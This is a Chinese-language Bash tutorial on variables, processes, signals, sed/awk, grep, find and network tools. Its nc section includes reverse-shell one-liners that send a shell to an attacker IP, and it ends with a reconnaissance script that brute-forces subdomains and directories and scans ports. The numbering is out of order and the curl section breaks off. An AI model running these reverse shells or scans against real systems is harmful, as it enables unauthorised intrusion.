## 一、高级变量操作

### 1.1 变量间接引用

```bash
#!/bin/bash

# 间接引用：变量名存储在另一个变量中
var_name="name"
name="张三"

echo "${!var_name}"  # 输出: 张三

# 动态变量名
prefix="user"
for i in 1 2 3; do
    eval "${prefix}_$i='用户$i'"
done

echo "$user_1"  # 用户1
echo "$user_2"  # 用户2
echo "$user_3"  # 用户3
```

### 1.2 变量默认值

```bash
#!/bin/bash

# ${var:-default} - var 未设置或为空时返回 default
echo "${UNDEFINED_VAR:-默认值}"  # 默认值

# ${var:=default} - 未设置时赋值并返回
echo "${UNDEFINED_VAR:=自动赋值}"  # 自动赋值
echo "$UNDEFINED_VAR"  # 自动赋值（变量已被赋值）

# ${var:?message} - 未设置时报错退出
# echo "${REQUIRED_VAR:?必须设置此变量}"

# ${var:+alt_value} - 已设置时返回 alt_value，否则返回空
set_var="已设置"
echo "${set_var:+替换值}"  # 替换值
echo "${UNSET_VAR:+替换值}"  # 空
```

### 1.3 变量长度与截取

```bash
str="Hello World, Bash is powerful"

# 长度
echo ${#str}  # 30

# 从左侧截取（删除最短匹配前缀）
echo ${str#*o}   # World, Bash is powerful
echo ${str##*o}  # werful

# 从右侧截取（删除最短匹配后缀）
echo ${str%o*}   # Hello World, Bash is p
echo ${str%%o*}  # Hell

# 按位置截取
echo ${str:7}      # orld, Bash is powerful
echo ${str:7:5}    # orld
echo ${str: -10}   # powerful（从末尾取）
```

### 1.4 变量替换

```bash
str="apple banana apple banana"

# 替换第一个匹配
echo ${str/apple/orange}  # orange banana apple banana

# 替换所有匹配
echo ${str//apple/orange}  # orange banana orange banana

# 替换前缀
echo ${str/#apple/APPLE}  # APPLE banana apple banana

# 替换后缀
echo ${str/%banana/BANANA}  # apple banana apple BANANA
```

### 1.5 变量大小写转换

```bash
str="Hello World"

echo ${str^^}  # HELLO WORLD（全大写）
echo ${str,,}  # hello world（全小写）
echo ${str^}   # Hello World（首字母大写，只有第一个字符）
echo ${str,}   # hello World（首字母小写）

# 按指定字符转换
echo ${str^^[aeiou]}  # HEllO WOrld（元音转大写）
echo ${str,,[HW]}     # hello world（H/W 转小写）
```

### 1.6 命名空间与变量作用域

```bash
#!/bin/bash

# 使用 declare 创建不同作用域的变量
declare -g global_var="全局"  # -g 全局（函数内也可声明全局）

func() {
    local local_var="局部"
    declare -g inside_global="函数内声明的全局"
}

func
echo "$inside_global"  # 函数内声明的全局

# 只读变量
declare -r readonly_var="只读"
# readonly_var="修改"  # 会报错

# 整数变量
declare -i count=0
count+=1
echo "$count"  # 1

# 数组
declare -a arr=(1 2 3)

# 关联数组
declare -A dict
dict["key"]="value"
```

## 二、进程管理

### 2.1 查看进程

```bash
# 查看所有进程
ps aux
ps -ef

# 查看进程树
pstree
ps auxf

# 实时监控
top
htop

# 查看指定进程
ps aux | grep nginx
pgrep nginx
pidof nginx

# 查看进程详细信息
cat /proc/1234/status
ls /proc/1234/
```

### 2.2 前台与后台

```bash
# 后台运行命令
command &

# 查看后台任务
jobs

# 将后台任务转到前台
fg %1

# 将前台任务转到后台（先 Ctrl+Z 暂停）
# Ctrl+Z 暂停
bg %1  # 后台继续运行

# 后台运行并忽略挂起信号
nohup command &
disown  # 从 shell 的作业表中移除
```

### 2.3 进程优先级

```bash
# 以指定优先级启动（nice 值 -20 到 19，越小优先级越高）
nice -n 10 command  # 低优先级
nice -n -10 command # 高优先级（需要 root）

# 修改已运行进程的优先级
renice 10 -p 1234
renice -5 -p 1234  # 提高优先级（需要 root）
```

### 2.4 终止进程

```bash
# 终止进程
kill 1234           # 发送 TERM 信号
kill -TERM 1234
kill -15 1234

# 强制终止
kill -9 1234
kill -KILL 1234

# 按名称终止
pkill nginx
killall nginx

# 信号列表
kill -l

# 常用信号
# 1  SIGHUP   挂起（重新加载配置）
# 2  SIGINT   中断（Ctrl+C）
# 9  SIGKILL  强制杀死（不可捕获）
# 15 SIGTERM  终止（可捕获，优雅退出）
# 17 SIGCHLD  子进程退出
# 18 SIGCONT  继续
# 19 SIGSTOP  暂停（不可捕获）
```

### 2.5 等待进程

```bash
#!/bin/bash

# 后台启动多个进程
sleep 2 &
pid1=$!

sleep 3 &
pid2=$!

echo "等待进程完成..."

# 等待指定进程
wait $pid1
echo "进程 1 完成"

# 等待所有后台进程
wait
echo "所有进程完成"

# 等待并获取退出码
sleep 1 &
wait $!
echo "退出码: $?"
```

## 三、信号处理

### 3.1 trap 命令

```bash
#!/bin/bash

# 捕获信号
trap 'echo "收到 SIGINT (Ctrl+C)"' SIGINT
trap 'echo "收到 SIGTERM"; exit 0' SIGTERM

# 捕获退出
trap 'echo "脚本退出"' EXIT

# 捕获错误
trap 'echo "第 $LINENO 行出错"' ERR

echo "运行中... 按 Ctrl+C 测试"
sleep 10
```

### 3.2 常用信号

| 信号 | 编号 | 说明 |
|------|------|------|
| SIGHUP | 1 | 终端挂起，常用来重新加载配置 |
| SIGINT | 2 | 中断（Ctrl+C） |
| SIGQUIT | 3 | 退出（Ctrl+\） |
| SIGKILL | 9 | 强制杀死（不可捕获、忽略） |
| SIGUSR1 | 10 | 用户自定义信号 1 |
| SIGSEGV | 11 | 段错误 |
| SIGUSR2 | 12 | 用户自定义信号 2 |
| SIGTERM | 15 | 终止（优雅退出） |
| SIGCHLD | 17 | 子进程状态改变 |
| SIGCONT | 18 | 继续执行 |
| SIGSTOP | 19 | 暂停（不可捕获、忽略） |
| SIGTSTP | 20 | 终端暂停（Ctrl+Z） |

### 3.3 优雅退出脚本

```bash
#!/bin/bash

# 清理函数
cleanup() {
    echo ""
    echo "正在清理..."
    # 关闭文件描述符
    exec 3>&- 2>/dev/null
    # 删除临时文件
    rm -f /tmp/temp_$$
    # 杀死子进程
    kill $(jobs -p) 2>/dev/null
    echo "清理完成，退出"
    exit 0
}

# 捕获退出信号
trap cleanup SIGINT SIGTERM SIGHUP EXIT

echo "脚本运行中（PID: $$）"
echo "按 Ctrl+C 退出"

while true; do
    sleep 1
done
```

### 3.4 信号通信

```bash
#!/bin/bash

# 父子进程信号通信示例

handler() {
    echo "父进程收到子进程信号"
}

trap handler SIGUSR1

if [ "$1" = "child" ]; then
    # 子进程
    echo "子进程 ($$) 正在运行"
    sleep 2
    echo "子进程发送 SIGUSR1 给父进程 ($PPID)"
    kill -SIGUSR1 $PPID
    sleep 1
    exit 0
fi

# 父进程
echo "父进程 ($$) 启动子进程..."
$0 child &
child_pid=$!
echo "子进程 PID: $child_pid"

wait $child_pid
echo "父进程结束"
```

## 四、sed 与 awk

### 4.1 sed 高级用法

**sed 地址范围**

```bash
# 行号操作
sed '5p' file.txt          # 打印第5行（加 -n 只打印匹配）
sed -n '5p' file.txt       # 只打印第5行
sed '2,5p' file.txt        # 打印第2-5行
sed '2,$p' file.txt        # 打印第2行到末尾
sed '1~2p' file.txt        # 从第1行开始，每隔2行（奇数行）

# 模式匹配
sed '/pattern/p' file.txt  # 打印匹配的行
sed '/pattern/,/end/p' file.txt  # 打印从 pattern 到 end 的行
sed '/pattern/,$p' file.txt  # 从匹配行到末尾

# 反向匹配
sed '/pattern/!p' file.txt  # 不匹配的行
```

**sed 多命令**

```bash
# 多个替换
sed -e 's/a/b/g' -e 's/c/d/g' file.txt

# 分号分隔
sed 's/a/b/g; s/c/d/g' file.txt

# 条件替换（匹配 pattern 的行才执行替换）
sed '/pattern/s/old/new/g' file.txt
```

**sed 分组与反向引用**

```bash
# 使用 \( \) 捕获分组，\1 \2 引用
echo "hello world" | sed 's/\(hello\) \(world\)/\2 \1/'
# 输出: world hello

# 提取 IP
echo "IP: 192.168.1.100" | sed 's/.*\([0-9.]*\).*/\1/'
```

**sed 脚本文件**

```bash
# 编写 sed 脚本 script.sed
cat > script.sed << 'EOF'
s/foo/bar/g
/pattern/d
s/^/# /
EOF

sed -f script.sed input.txt
```

### 4.2 awk 高级用法

**awk 变量**

```bash
# 内置变量
awk '{print NR, NF, $0}' file.txt
# NR = 记录数（行号）
# NF = 字段数
# $0 = 整行
# $1, $2... = 第1、2...个字段
# FS = 输入字段分隔符
# OFS = 输出字段分隔符
# RS = 输入记录分隔符
# ORS = 输出记录分隔符
# FILENAME = 当前文件名
```

**awk 条件与循环**

```bash
# if 语句
awk '{
    if ($3 > 100) {
        print $1, "大值"
    } else {
        print $1, "小值"
    }
}' data.txt

# for 循环
awk '{
    sum = 0
    for (i = 1; i <= NF; i++) {
        sum += $i
    }
    print sum
}' numbers.txt

# while 循环
awk '{
    i = 1
    while (i <= NF) {
        print $i
        i++
    }
}' data.txt
```

**awk 数组**

```bash
# 统计 IP 出现次数
awk '{count[$1]++} END {for (ip in count) print count[ip], ip}' access.log | sort -rn

# 关联数组
awk 'BEGIN {
    dict["apple"] = 1
    dict["banana"] = 2
    for (key in dict) {
        print key, dict[key]
    }
}'

# 检查键是否存在
awk 'BEGIN {
    arr["a"] = 1
    if ("a" in arr) print "存在"
    if ("b" in arr) print "存在" else print "不存在"
}'
```

**awk 函数**

```bash
# 字符串函数
echo "Hello World" | awk '{print toupper($0)}'
echo "Hello World" | awk '{print tolower($0)}'
echo "Hello" | awk '{print length($0)}'
echo "hello world" | awk '{print substr($0, 1, 5)}'
echo "a,b,c" | awk '{print split($0, arr, ",")}'

# 数学函数
awk 'BEGIN {
    print sqrt(16)
    print int(3.14)
    print log(10)
    print exp(1)
}'

# 自定义函数
awk '
function factorial(n) {
    if (n <= 1) return 1
    return n * factorial(n - 1)
}
BEGIN {
    print factorial(5)
}'
```

**awk 多文件处理**

```bash
# 处理多个文件
awk '
FNR == NR {
    # 第一个文件
    arr[$1] = $2
    next
}
{
    # 第二个文件
    if ($1 in arr) {
        print $1, arr[$1], $2
    }
}' file1.txt file2.txt
```

### 4.3 sed + awk 组合

```bash
# 日志分析示例
cat access.log | \
    sed 's/"//g' | \
    awk '{
        ip = $1
        status = $9
        url = $7
        if (status == 404) {
            count[url]++
        }
    }
    END {
        for (url in count) {
            print count[url], url
        }
    }' | \
    sort -rn | \
    head -20
```

## 五、grep 高级用法

### 5.1 正则表达式类型

```bash
# 基本正则（BRE）- 默认
grep "a.*b" file.txt

# 扩展正则（ERE）
grep -E "a+b" file.txt
egrep "a+b" file.txt  # 等价

# Perl 正则（PCRE）
grep -P "\d+" file.txt

# 固定字符串（不解析正则）
grep -F "a.b" file.txt
fgrep "a.b" file.txt  # 等价
```

### 5.2 常用选项组合

```bash
# 递归搜索目录
grep -r "pattern" /path/
grep -R "pattern" /path/  # 跟随符号链接

# 只显示文件名
grep -l "pattern" *.txt

# 不显示文件名
grep -h "pattern" *.txt

# 显示行号
grep -n "pattern" file.txt

# 显示上下文
grep -C 3 "pattern" file.txt  # 前后各3行
grep -B 3 "pattern" file.txt  # 前3行
grep -A 3 "pattern" file.txt  # 后3行

# 只显示匹配部分
grep -o "pattern" file.txt

# 统计匹配数
grep -c "pattern" file.txt

# 静默模式（只看退出码）
grep -q "pattern" file.txt
if [ $? -eq 0 ]; then
    echo "找到"
fi

# 颜色高亮
grep --color=auto "pattern" file.txt
```

### 5.3 多模式搜索

```bash
# 匹配任一模式
grep -e "pattern1" -e "pattern2" file.txt
grep -E "pattern1|pattern2" file.txt

# 从文件读取模式
grep -f patterns.txt file.txt

# 同时满足多个模式（管道方式）
grep "pattern1" file.txt | grep "pattern2"
```

### 5.4 文件过滤

```bash
# 指定文件类型
grep -r "pattern" --include="*.txt" /path/
grep -r "pattern" --include="*.{html,js}" /path/

# 排除文件类型
grep -r "pattern" --exclude="*.log" /path/

# 排除目录
grep -r "pattern" --exclude-dir={.git,node_modules} /path/

# 只搜索二进制文件
grep -a "pattern" binary_file

# 跳过二进制文件
grep -I "pattern" *
```

### 5.5 反向匹配

```bash
# 不匹配的行
grep -v "pattern" file.txt

# 不匹配的文件
grep -L "pattern" *.txt

# 空行
grep -v "^$" file.txt  # 去掉空行

# 注释行
grep -v "^#" file.txt  # 去掉注释行
```

## 六、find 与 xargs

### 6.1 find 基础

```bash
# 按名称查找
find /path -name "*.txt"
find /path -iname "*.TXT"  # 忽略大小写

# 按类型查找
find /path -type f   # 文件
find /path -type d   # 目录
find /path -type l   # 符号链接
find /path -type s   # socket

# 按大小查找
find /path -size 10M    # 等于 10MB
find /path -size +10M   # 大于 10MB
find /path -size -10M   # 小于 10MB
# 单位：b(512字节块), c(字节), k(KB), M(MB), G(GB)

# 按时间查找
find /path -mtime 7     # 7天前修改的
find /path -mtime -7    # 7天内修改的
find /path -mtime +7    # 7天前修改的
find /path -mmin -60    # 60分钟内修改的
find /path -atime -7    # 7天内访问的
find /path -ctime -7    # 7天内状态改变的

# 按权限查找
find /path -perm 755       # 精确匹配 755
find /path -perm -755      # 至少 755 权限
find /path -perm /755      # 有任一权限位匹配
find /path -perm -4000     # 设置了 SUID
find /path -perm -2000     # 设置了 SGID
find /path -perm -1000     # 设置了 sticky

# 按用户/组查找
find /path -user username
find /path -group groupname
find /path -uid 1000
find /path -nogroup  # 没有属组的文件
find /path -nouser   # 没有属主的文件
```

### 6.2 find 高级操作

```bash
# 限制深度
find /path -maxdepth 2 -name "*.txt"
find /path -mindepth 2 -name "*.txt"

# 空文件/目录
find /path -empty

# 可执行文件
find /path -executable

# 组合条件
find /path \( -name "*.txt" -o -name "*.sh" \) -size +1M
# -a 与（默认），-o 或，! 非

# 对找到的文件执行命令
find /path -name "*.log" -exec rm {} \;
find /path -name "*.bak" -exec mv {} /backup/ \;

# 优化：用 + 代替 \; 减少命令调用
find /path -name "*.txt" -exec cat {} +

# 删除文件
find /path -name "*.tmp" -delete

# 更安全的 xargs 配合
find /path -name "*.txt" -print0 | xargs -0 rm
```

### 6.3 xargs 用法

```bash
# 基本用法
cat filelist.txt | xargs rm

# 指定命令参数位置
cat filelist.txt | xargs -I{} cp {} /backup/

# 每次传 N 个参数
cat filelist.txt | xargs -n 2 echo

# 并行执行
cat filelist.txt | xargs -P 4 -I{} process {}

# 处理包含空格的文件名
find . -name "*.txt" -print0 | xargs -0 rm

# 交互确认
cat filelist.txt | xargs -p rm

# 显示命令但不执行（测试）
cat filelist.txt | xargs -t echo
```

### 6.4 安全审计示例

```bash
# 查找 SUID 文件（提权检查）
find / -perm -4000 -type f 2>/dev/null

# 查找可写的 /etc 下文件
find /etc -writable -type f 2>/dev/null

# 查找所有用户可读的敏感文件
find / -name "*.key" -o -name "*.pem" 2>/dev/null

# 查找最近 24 小时修改的配置文件
find /etc -mtime -1 -type f 2>/dev/null

# 查找大文件（大于 100MB）
find / -type f -size +100M -exec ls -lh {} \; 2>/dev/null | sort -k5 -hr
```

## 七、网络工具（nc/curl/wget）

### 7.1 netcat (nc)

**基本用法**

```bash
# 连接到远程端口
nc example.com 80

# 监听端口
nc -lvnp 4444
# -l 监听模式
# -v 详细输出
# -n 不解析域名
# -p 指定端口

# 传输文件
# 接收端
nc -lvnp 4444 > received_file
# 发送端
nc target_ip 4444 < send_file
```

**端口扫描**

```bash
# TCP 端口扫描
nc -zv 192.168.1.1 1-1000 2>&1 | grep succeeded

# UDP 端口扫描
nc -zuv 192.168.1.1 53 123

# 指定超时时间
nc -zv -w 1 192.168.1.1 80
```

**反向 Shell**

```bash
# 攻击机监听
nc -lvnp 4444

# 目标机连接（有 -e 参数时）
nc -e /bin/bash 192.168.1.100 4444

# 无 -e 参数时（使用命名管道）
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

**Banner 抓取**

```bash
# HTTP Banner
echo "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80

# FTP Banner
echo "QUIT" | nc ftp.example.com 21

# SMTP Banner
echo "QUIT" | nc smtp.example.com 25
```

### 7.2 curl

**基本请求**

```bash
# GET 请求
curl http://example.com
```

```bash
#!/bin/bash
# 简单的链接提取爬虫

base_url="$1"
depth="${2:-2}"

visited=()

extract_links() {
    local url="$1"
    local current_depth="$2"
    
    # 避免重复访问
    for v in "${visited[@]}"; do
        [ "$v" = "$url" ] && return
    done
    visited+=("$url")
    
    echo "[*] 深度 $current_depth: $url"
    
    if [ "$current_depth" -ge "$depth" ]; then
        return
    fi
    
    # 提取链接
    links=$(curl -s "$url" | grep -oP 'href="\K[^"]+' | \
        grep -E "^(http|/)" | head -20)
    
    while IFS= read -r link; do
        [ -z "$link" ] && continue
        
        # 处理相对路径
        if [[ "$link" == /* ]]; then
            full_link="${base_url}${link}"
        elif [[ "$link" == http* ]]; then
            full_link="$link"
        else
            continue
        fi
        
        # 只爬取同域名
        if [[ "$full_link" == "$base_url"* ]]; then
            extract_links "$full_link" $((current_depth + 1))
        fi
    done <<< "$links"
}

extract_links "$base_url" 0

echo ""
echo "共发现 ${#visited[@]} 个链接"
printf '%s\n' "${visited[@]}"
```

### 4.1 高级信息收集脚本

```bash
#!/bin/bash
# ===== 高级信息收集工具 =====

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 输出函数
info() { echo -e "${GREEN}[INFO]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERR]${NC} $1"; }

# ===== WHOIS 查询 =====
whois_lookup() {
    local domain=$1
    info "WHOIS 查询: $domain"
    if command -v whois &> /dev/null; then
        whois "$domain" | grep -E "Registrant|Registrar|Creation Date|Expiration Date|Name Server"
    else
        warn "whois 命令未安装"
    fi
}

# ===== DNS 枚举 =====
dns_enum() {
    local domain=$1
    info "DNS 枚举: $domain"
    
    # A 记录
    echo "A 记录:"
    dig +short A "$domain" 2>/dev/null || nslookup "$domain" 2>/dev/null
    
    # MX 记录
    echo -e "\nMX 记录:"
    dig +short MX "$domain" 2>/dev/null
    
    # NS 记录
    echo -e "\nNS 记录:"
    dig +short NS "$domain" 2>/dev/null
    
    # TXT 记录
    echo -e "\nTXT 记录:"
    dig +short TXT "$domain" 2>/dev/null
    
    # 区域传送测试
    echo -e "\n区域传送测试:"
    for ns in $(dig +short NS "$domain"); do
        if dig @"$ns" "$domain" AXFR 2>/dev/null | grep -q "Transfer failed"; then
            echo "  $ns: 拒绝区域传送"
        else
            echo "  $ns: ${RED}可能存在区域传送漏洞!${NC}"
        fi
    done
}

# ===== 子域名爆破 =====
subdomain_brute() {
    local domain=$1
    local wordlist=$2
    info "子域名爆破: $domain"
    
    if [ ! -f "$wordlist" ]; then
        error "字典文件不存在: $wordlist"
        return
    fi
    
    local count=0
    local found=0
    local total=$(wc -l < "$wordlist")
    
    while read -r sub; do
        count=$((count + 1))
        if [ $((count % 100)) -eq 0 ]; then
            info "进度: $count/$total"
        fi
        
        if dig +short "$sub.$domain" &> /dev/null && [ -n "$(dig +short "$sub.$domain" 2>/dev/null)" ]; then
            echo -e "${GREEN}[+]${NC} $sub.$domain -> $(dig +short "$sub.$domain" | head -1)"
            found=$((found + 1))
        fi
    done < "$wordlist"
    
    info "发现 $found 个子域名"
}

# ===== 端口扫描 =====
port_scan() {
    local host=$1
    local start_port=${2:-1}
    local end_port=${3:-1000}
    local timeout=${4:-0.5}
    
    info "端口扫描: $host ($start_port-$end_port)"
    
    local open_ports=()
    
    for port in $(seq "$start_port" "$end_port"); do
        if timeout "$timeout" bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null; then
            echo -e "${GREEN}[+]${NC} 端口 $port 开放"
            open_ports+=("$port")
        fi
    done
    
    info "扫描完成，发现 ${#open_ports[@]} 个开放端口"
}

# ===== 目录爆破 =====
dir_brute() {
    local url=$1
    local wordlist=$2
    info "目录爆破: $url"
    
    if [ ! -f "$wordlist" ]; then
        error "字典文件不存在: $wordlist"
        return
    fi
    
    url="${url%/}"  # 去掉末尾的 /
    
    while read -r path; do
        local status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$path" 2>/dev/null)
        case "$status" in
            200) echo -e "${GREEN}[200]${NC} /$path" ;;
            301|302) echo -e "${YELLOW}[$status]${NC} /$path" ;;
            403) echo -e "${RED}[403]${NC} /$path" ;;
        esac
    done < "$wordlist"
}

# ===== CMS 识别 =====
cms_detect() {
    local url=$1
    info "CMS 识别: $url"
    
    # 下载首页
    local html=$(curl -s "$url" 2>/dev/null)
    
    # WordPress
    if echo "$html" | grep -qi "wordpress\|wp-content\|wp-includes"; then
        echo -e "${GREEN}[+]${NC} WordPress"
        # 检查版本
        local wp_version=$(echo "$html" | grep -oP 'content="WordPress \K[0-9.]+' | head -1)
        [ -n "$wp_version" ] && echo "    版本: $wp_version"
    fi
    
    # Joomla
    if echo "$html" | grep -qi "joomla\|/templates/"; then
        echo -e "${GREEN}[+]${NC} Joomla"
    fi
    
    # Drupal
    if echo "$html" | grep -qi "drupal\|/sites/all/"; then
        echo -e "${GREEN}[+]${NC} Drupal"
    fi
}

# ===== 主函数 =====
main() {
    local target=$1
    local wordlist=${2:-subdomains.txt}
    
    if [ -z "$target" ]; then
        echo "用法: $0 <domain> [wordlist]"
        echo "示例: $0 example.com subdomains.txt"
        exit 1
    fi
    
    echo "========================================"
    echo "  高级信息收集工具"
    echo "  目标: $target"
    echo "========================================"
    echo ""
    
    whois_lookup "$target"
    echo ""
    dns_enum "$target"
    echo ""
    cms_detect "https://$target"
    echo ""
    
    # 端口扫描常见端口
    port_scan "$target" 1 1000 0.3
}

# main "$@"
```
